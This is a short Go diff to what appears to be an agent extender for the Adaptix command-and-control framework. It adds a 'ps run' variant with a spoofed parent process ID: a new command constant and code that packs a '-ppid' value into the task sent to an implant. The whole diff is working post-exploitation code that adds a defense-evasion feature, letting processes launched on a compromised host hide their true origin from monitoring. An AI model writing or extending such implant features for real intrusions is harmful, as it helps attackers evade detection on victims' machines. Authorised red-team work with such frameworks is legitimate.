@@ -232,6 +232,10 @@ const (
 	COMMAND_LINK   = 73
 	COMMAND_UNLINK = 74
 
+	// ps run with a spoofed parent pid (free id after the pivot pair):
+	// COMMAND_PS_RUN layout plus int ppid before the args.
+	COMMAND_PS_RUN_PPID = 75
+
 	// Tunnels (native numbering; TCP only — the original specter's
 	// tunnel.c is TCP-only too). Tasks ride TunnelCallbacks (PROXY_DATA),
 	// per-connection I/O rides TUNNEL_START/WRITE/CLOSE/ACCEPT records.
@@ -1006,6 +1010,11 @@ func (e *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[stri
 			programArgs = Ts.TsConvertUTF8toCp(programArgs, agentData.ACP)
 
 			array = []interface{}{COMMAND_PS_RUN, output, impersonation, programState, programArgs}
+			if ppidArg, ok := args["-ppid"].(float64); ok && ppidArg > 0 {
+				// PPID spoof: extended record with the parent pid.
+				array = []interface{}{COMMAND_PS_RUN_PPID, output, impersonation, programState, int(ppidArg), programArgs}
+				messageData.Message = fmt.Sprintf("Task: ps run (ppid %d) %s", int(ppidArg), programArgs)
+			}
 		} else {
 			err = errors.New("subcommand must be 'list', 'kill' or 'run'")
 			goto RET
